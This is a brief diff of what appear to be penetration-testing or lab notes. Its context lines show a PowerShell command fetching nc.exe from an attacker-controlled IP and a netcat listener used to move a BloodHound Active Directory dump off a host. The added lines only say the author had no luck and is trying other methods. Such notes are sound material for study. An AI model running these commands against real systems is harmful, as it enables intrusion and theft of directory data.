@@ -142,5 +142,7 @@ iwr -uri "http://192.168.45.228:8888/nc.exe" -outfile "C:\Users\joe\Downloads\nc
 .\nc.exe -l -p 4444>20231231101949_BloodHound.zip
 ```
 
+well had no luck doing this last night, have found some other methods, picking back up
+
 
 
